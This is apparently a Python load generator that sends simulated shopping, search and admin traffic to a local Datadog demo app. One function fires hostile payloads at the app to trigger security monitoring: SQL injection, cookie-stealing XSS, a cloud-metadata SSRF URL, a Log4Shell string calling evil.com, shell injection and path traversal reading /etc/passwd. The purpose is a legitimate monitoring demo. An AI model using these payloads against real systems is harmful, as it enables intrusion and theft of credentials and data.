"""
Datadog Marketplace Load Generator
Simulates realistic user traffic to generate APM traces, logs, and errors.
Run: python3 loadgen/loadgen.py

CPU-aware: monitors host CPU via psutil and backs off automatically to avoid
impacting the SE's work machine or ruining a live demo.
"""
import requests
import random
import time
import uuid
import sys
import os

BASE = "http://localhost:8080/api"
USERS = ["alice@acme.com", "bob@globex.com", "carol@initech.com", "dave@umbrella.com", "eve@hooli.com"]
SEARCH_TERMS = ["monitoring", "APM", "logs", "infrastructure", "security", "synthetics", "tracing", "profiling", "RUM", "database"]

# ── CPU guard (inline — loadgen doesn't import from backend/shared) ───────────
try:
    import psutil
    _PSUTIL = True
except ImportError:
    _PSUTIL = False

_CPU_THROTTLE = 75   # % — slow down the loadgen
_CPU_CRITICAL = 85   # % — pause the loadgen entirely for a bit


def _host_cpu() -> float:
    """Current host CPU %. Returns 0 if psutil unavailable."""
    if not _PSUTIL:
        return 0.0
    try:
        return psutil.cpu_percent(interval=None)   # non-blocking, uses cached value
    except Exception:
        return 0.0


def _cpu_sleep(base: float) -> None:
    """Sleep for base seconds, extended proportionally if host CPU is elevated."""
    cpu = _host_cpu()
    if cpu >= _CPU_CRITICAL:
        print(f"  [cpu-guard] CRITICAL {cpu:.0f}% — pausing loadgen for 10s")
        time.sleep(10.0)
    elif cpu >= _CPU_THROTTLE:
        extended = base * 2.5
        print(f"  [cpu-guard] THROTTLE {cpu:.0f}% — extending sleep to {extended:.1f}s")
        time.sleep(extended)
    else:
        time.sleep(base + random.uniform(-0.5, 1.0))


def session_headers():
    return {"X-Session-Id": f"loadgen-{uuid.uuid4().hex[:8]}", "Content-Type": "application/json"}


def browse_and_buy():
    """Simulates a user browsing, adding to cart, and checking out."""
    h = session_headers()
    try:
        # Browse products (triggers N+1 + potential AttributeError on product with NULL description)
        r = requests.get(f"{BASE}/products", headers=h, timeout=10)
        products = r.json() if r.ok else []
        print(f"  [browse] {len(products)} products listed | {r.status_code}")

        if not products:
            return

        # View a random product detail
        p = random.choice(products)
        r = requests.get(f"{BASE}/products/{p['id']}", headers=h, timeout=10)
        print(f"  [product] id={p['id']} | {r.status_code}")

        # Sometimes hit the cursed product ID (ends in 3 → NULL description bug)
        if random.random() < 0.2:
            r = requests.get(f"{BASE}/products/3", headers=h, timeout=10)
            print(f"  [cursed] products/3 | {r.status_code}")

        # Fetch recommendations (slow endpoint — 1-3s delay)
        r = requests.get(f"{BASE}/recommendations", headers=h, timeout=15)
        print(f"  [recs] {r.status_code} ({r.elapsed.total_seconds():.2f}s)")

        # Add 1-3 items to cart
        chosen = random.sample(products, min(random.randint(1, 3), len(products)))
        for item in chosen:
            requests.post(f"{BASE}/cart", headers=h, json={"product_id": item["id"], "quantity": 1}, timeout=5)

        # Checkout (15% failure rate baked in)
        email = random.choice(USERS)
        r = requests.post(f"{BASE}/checkout", headers=h, json={"email": email}, timeout=15)
        status = "✓ success" if r.ok else f"✗ {r.json().get('error', 'failed')}"
        print(f"  [checkout] {email} | {r.status_code} {status}")

    except Exception as e:
        print(f"  [error] {type(e).__name__}: {e}")


def search_traffic():
    """Simulates search queries (triggers slow unindexed LIKE queries)."""
    h = session_headers()
    q = random.choice(SEARCH_TERMS)
    try:
        r = requests.get(f"{BASE}/search", params={"q": q}, headers=h, timeout=10)
        print(f"  [search] q={q!r} | {r.status_code} ({r.elapsed.total_seconds():.2f}s)")
    except Exception as e:
        print(f"  [search error] {e}")


def admin_traffic():
    """Occasionally hits the stats endpoint and CPU spike endpoint."""
    h = session_headers()
    try:
        r = requests.get(f"{BASE}/stats", headers=h, timeout=10)
        stats = r.json()
        print(f"  [admin] orders={stats.get('total_orders')} memory_leak_entries={stats.get('memory_leak_entries')}")

        # Trigger CPU spike — but only when host CPU is not already elevated.
        # The analytics service has its own guard too, but we avoid the round-trip
        # entirely when the machine is already hot.
        cpu = _host_cpu()
        if cpu >= _CPU_THROTTLE:
            print(f"  [cpu-guard] Skipping /compute — host CPU at {cpu:.0f}%")
            return

        if random.random() < 0.3:
            # Tighter n range than before — still causes a meaningful spike but
            # won't peg a core for 30+ seconds
            n = random.choice([10_000, 20_000, 30_000, 50_000])
            r = requests.get(f"{BASE}/compute", params={"n": n}, headers=h, timeout=60)
            result = r.json() if r.ok else {}
            throttled = result.get("throttled", False)
            tag = " [throttled by guard]" if throttled else ""
            print(f"  [cpu] n={n} | {r.elapsed.total_seconds():.2f}s{tag}")

    except Exception as e:
        print(f"  [admin error] {e}")


def attack_traffic():
    """Simulates malicious requests to trigger ASM (Application Security Management).
    These payloads are safe — they're just strings that ASM pattern-matches on."""
    h = session_headers()
    attacks = [
        # SQL injection attempts
        ("search", {"q": "' OR 1=1 --"}),
        ("search", {"q": "admin'; DROP TABLE products;--"}),
        ("search", {"q": "' UNION SELECT username, password FROM users--"}),
        # XSS attempts
        ("search", {"q": "<script>alert('xss')</script>"}),
        ("search", {"q": "<img src=x onerror=alert(document.cookie)>"}),
        # Path traversal
        ("product_traversal", None),
        # Server-side request forgery (SSRF)
        ("search", {"q": "http://169.254.169.254/latest/meta-data/"}),
        # Log4Shell style
        ("search", {"q": "${jndi:ldap://evil.com/exploit}"}),
        # Shell injection
        ("search", {"q": "; cat /etc/passwd"}),
        ("search", {"q": "| ls -la /"}),
    ]
    attack_type, payload = random.choice(attacks)
    try:
        if attack_type == "product_traversal":
            r = requests.get(f"{BASE}/products/../../etc/passwd", headers=h, timeout=5)
            print(f"  [attack] path traversal | {r.status_code}")
        else:
            r = requests.get(f"{BASE}/search", params=payload, headers=h, timeout=10)
            q = payload.get("q", "")[:40]
            print(f"  [attack] {q!r} | {r.status_code}")
    except Exception as e:
        print(f"  [attack error] {e}")


def run():
    print("Datadog Marketplace Load Generator starting... (Ctrl+C to stop)")
    print(f"Target: {BASE}")
    if _PSUTIL:
        print(f"CPU guard: active (throttle >{_CPU_THROTTLE}%, critical >{_CPU_CRITICAL}%)")
    else:
        print("CPU guard: disabled (install psutil to enable)")
    print()

    # Warm up the psutil CPU reading — first call always returns 0
    if _PSUTIL:
        psutil.cpu_percent(interval=1)

    interval = float(sys.argv[1]) if len(sys.argv) > 1 else 2.0

    iteration = 0
    while True:
        iteration += 1
        cpu = _host_cpu()
        cpu_tag = f" [cpu:{cpu:.0f}%]" if _PSUTIL else ""
        print(f"\n── Iteration {iteration}{cpu_tag} ──")

        action = random.choices(
            ["browse", "search", "admin", "attack"],
            weights=[60, 15, 10, 15],
        )[0]

        if action == "browse":
            browse_and_buy()
        elif action == "search":
            search_traffic()
        elif action == "admin":
            admin_traffic()
        elif action == "attack":
            attack_traffic()

        _cpu_sleep(interval)


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print("\nStopped.")
